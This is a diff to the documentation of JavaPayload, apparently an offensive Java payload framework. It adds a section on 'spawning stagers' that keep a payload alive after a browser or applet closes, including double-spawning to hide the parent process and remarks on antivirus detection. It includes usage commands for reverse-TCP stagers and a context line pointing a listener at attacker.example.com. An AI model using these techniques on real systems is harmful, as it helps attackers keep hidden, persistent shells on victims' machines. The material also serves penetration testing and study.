@@ -82,6 +82,19 @@ multiple times (even multi-threaded). This will work with ReverseTCP and Reverse
 command line for this to the stager. Example: <tt>MultiListen ReverseTCP attacker.example.com -- SystemInfo</tt>.
 </p>
 
+
+<p>It is also possible to "convert" any supported stager to a spawning stager. Often Java is embedded
+into other systems (like web browsers), and when the user stops using your web site, your payload will be
+killed - unless you use a spawning stager, which will make the stager not
+run inside the victim process, but spawn a new process and run inside that one. This won't work for
+some stagers, like <tt>JDWPTunnel</tt>, that depend on some external state of the process they are
+loaded into, but any other stager that can build standalone class files can be used.</p>
+
+<p>There is another drawback as well: As the new process will have to load the class from disk, your stager
+will be dumped to disk (and deleted later), which may increase the risk of antivirus detection. On the
+other hand, in the main usage scenario for these stagers - Java applets - the applet has been stored to
+disk anyway (in the browser cache and/or the Java plugin cache).</p>
+
 <h3>Stages</h3>
 
 <p>Stages are loaded by a stager and responsible for doing what you want to do on the victim's host (like provide a
@@ -308,6 +321,32 @@ first:</p>
 <p><b>On the "victim" machine:</b></p>
 
 <p>Open the document with OpenOffice and say "yes" when you are asked whether to execute macros.</p>
+
+<h3>Spawning stagers</h3>
+
+<p>For all the stagers included, there is already a pre-built spawning stager available, whose name is 
+prefixed by <tt>Spawn</tt>. They can be used like any other stagers, for example:</p>
+
+<p><tt>java javapayload.handler.stager.StagerHandler SpawnReverseTCP localhost # -- JSh</tt></p>
+<p><tt>java javapayload.loader.StandaloneLoader SpawnReverseTCP localhost 1687 -- JSh</tt></p>
+
+<p>To build spawning stagers for any number of other stagers, you can use a
+command like this:</p>
+
+<p><tt>java javapayload.builder.SpawnStagerBuilder SomeStager AnotherStager [...]</tt></p>
+
+<p>This will create a file called <tt>SpawnStagers.jar</tt> that contains new stagers whose names start
+with <tt>Spawn</tt>, like <tt>SpawnSomeStager</tt>. After adding them to the class path, you can use them
+like the already included stagers.</p>
+
+<p>On some systems (like Windows), the parent process information is lost when the parent process dies.
+Therefore it can be useful to have a stager that spawns twice (so that the resulting child process it not
+associated to any living parent process). Therefore, stagers starting with <tt>SpawnSpawn</tt> are included
+for all built-in stagers. To achieve this for other stagers, just wrap them again:</p>
+
+<p><tt>copy SpawnStagers.jar SpawnStagers2.jar</tt></p>
+<p><tt>set CLASSPATH=SpawnStagers2.jar;%CLASSPATH%</tt></p>
+<p><tt>java javapayload.builder.SpawnStagerBuilder SpawnSomeStager SpawnAnotherStager</tt></p>
 
 </body>
 </html>
